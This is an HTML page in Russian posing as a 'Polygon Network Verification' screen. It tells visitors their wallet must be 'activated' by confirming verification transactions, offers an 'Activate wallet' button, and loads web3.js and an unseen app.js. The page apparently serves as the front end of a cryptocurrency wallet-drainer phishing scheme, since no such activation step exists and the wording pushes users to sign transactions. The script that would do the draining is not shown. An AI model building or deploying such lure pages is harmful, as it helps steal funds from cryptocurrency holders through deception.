<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Polygon Network Verification</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            background-color: #0f172a;
            color: white;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .card {
            background: #1e293b;
            padding: 2rem;
            border-radius: 1.5rem;
            text-align: center;
            box-shadow: 0 10px 25px rgba(0,0,0,0.5);
            max-width: 350px;
            width: 100%;
        }
        .logo {
            width: 60px;
            height: 60px;
            margin-bottom: 1rem;
        }
        h1 { font-size: 1.25rem; margin-bottom: 0.5rem; }
        p { color: #94a3b8; font-size: 0.9rem; margin-bottom: 1.5rem; }
        
        .btn {
            background: #7c3aed;
            color: white;
            border: none;
            padding: 0.75rem 1.5rem;
            border-radius: 0.75rem;
            font-weight: bold;
            cursor: pointer;
            width: 100%;
            font-size: 1rem;
            transition: background 0.2s;
        }
        .btn:hover { background: #6d28d9; }
        
        #status {
            margin-top: 1.25rem;
            font-size: 0.85rem;
            color: #fbbf24;
            min-height: 1.2rem;
        }
    </style>
</head>
<body>

    <div class="card">
        <img src="https://cryptologos.cc/logos/polygon-matic-logo.png" alt="Polygon" class="logo">
        <h1>Синхронизация POL</h1>
        <p>Для активации кошелька в сети Polygon подтвердите транзакции верификации.</p>
        
        <button id="startBtn" class="btn">Активировать кошелек</button>
        
        <div id="status">Ожидание подключения...</div>
    </div>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.8.1/web3.min.js"></script>
    
    <script src="app.js"></script>

</body>
</html>
